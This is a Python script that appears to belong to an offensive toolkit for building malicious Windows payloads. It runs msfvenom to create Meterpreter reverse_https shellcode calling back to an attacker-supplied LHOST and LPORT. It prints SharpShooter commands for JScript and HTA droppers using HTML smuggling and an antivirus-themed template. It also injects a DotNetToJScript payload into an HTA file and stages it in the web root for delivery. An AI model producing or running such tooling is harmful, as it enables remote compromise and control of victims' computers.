 #!/bin/python3
import subprocess
import socket
import random
import os
from colorama import init
from termcolor import colored

def read_file(f):
        with open(f, 'r') as fs:
            content = fs.read()
        return content

def generateJScriptPayload(lhost, lport):
    print(colored("[+] Generating JScript exploit - SharpShooter", 'green'))

    # sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f raw -o /var/www/html/shell.txt
    # sudo python2 SharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile /var/www/html/shell.txt --output jscript_payload --amsi amsienable

    print(colored(f"    [+] Meterpreter shellcode saved in /tmp/shell.txt", 'green'))
    print(colored(f"    [+] msfvenom -p windows/x64/metepreter/reverse_https lhost={lhost} lport={str(lport)} -f raw -o /tmp/shell.txt", 'cyan'))
    subprocess.run(["msfvenom", "-p", "windows/x64/meterpreter/reverse_https", "LHOST="+lhost, "LPORT="+str(lport), "-f", "raw", "-o", "/tmp/shell.txt"], capture_output=True, text=True)

    print(colored(f"    [!]", 'red') + colored(" Use SharpShooter to generate JScript payload with HTML smuggling delivery", 'yellow'))
    print(colored(f"        [>] sudo python2 SharpShooter.py --stageless --dotnetver 4 --payload js --output js_payload --rawscfile /tmp/shell.txt",'cyan'))
    print(colored(f"        [>] sudo python2 SharpShooter.py --stageless --dotnetver 4 --payload hta --output hta_payload --rawscfile /tmp/shell.txt --smuggle --template mcafee",'cyan'))
    print(colored(f"        [>] cp <sharp shooter>/output/jscript_payload.html /var/www/html",'cyan'))


def generateHtaJScriptPayload(arch):
    print(colored("[+] Generating JScript -> HTA exploit", 'green'))
    print(colored(f"    [!]", 'red') + colored(" DotNetToJScript js exploit is required! (in /mnt/tools/met.js)", 'yellow'))

    JScriptFile = "/mnt/tools/met.js"
    payload = ""

    try:
        payload = read_file(JScriptFile)

    except:
         print(colored(f"    [-] JScript File not found in /mnt/tools/met.js !",'red'))
         return

    template_name = "js_hta.hta"
    template = read_file("templates/" + template_name)
    template_out = template.replace("%PAYLOAD%", payload)
    
    f = open(f"output/{arch}/" + template_name, 'w')
    f.write(template_out)
    f.close()

    out_dir = os.getcwd() + f"/output/{arch}"
    print(colored(f"    [+] Copying js_hta.hta to /var/www/html/met.hta", 'green'))
    os.system(f"cp {out_dir}/js_hta.hta /var/www/html/met.hta")



